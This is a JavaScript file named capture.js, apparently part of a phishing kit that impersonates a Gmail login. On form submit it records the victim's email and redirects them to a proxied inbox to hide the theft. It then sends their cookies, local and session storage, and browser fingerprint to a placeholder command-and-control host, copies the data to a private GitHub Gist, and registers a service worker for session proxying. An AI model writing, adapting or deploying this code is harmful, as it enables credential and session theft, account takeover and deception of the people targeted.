// capture.js - Steal everything
let victimData = {};

document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('identifier').value;
    victimData.email = email;
    
    // Redirect to REAL Gmail through proxy (victim thinks it worked)
    window.location.href = '/mail/u/0/#inbox';
    
    // Immediate exfil
    await exfiltrate();
});

async function exfiltrate() {
    // Capture all available data
    const data = {
        ...victimData,
        cookies: document.cookie,
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage },
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    // Send to your C2 via image beacon (stealthy)
    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
    const url = URL.createObjectURL(blob);
    
    fetch('https://your-c2.com/capture', {
        method: 'POST',
        body: JSON.stringify(data),
        mode: 'no-cors'
    });
    
    // GitHub Gist backup (legit-looking)
    fetch('https://api.github.com/gists', {
        method: 'POST',
        headers: { Authorization: 'token YOUR_GITHUB_TOKEN' },
        body: JSON.stringify({
            description: 'pentest-data',
            public: false,
            files: { [`victim-${Date.now()}`]: { content: JSON.stringify(data) } }
        })
    });
}

// Service Worker registration for full session proxying
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js');
}
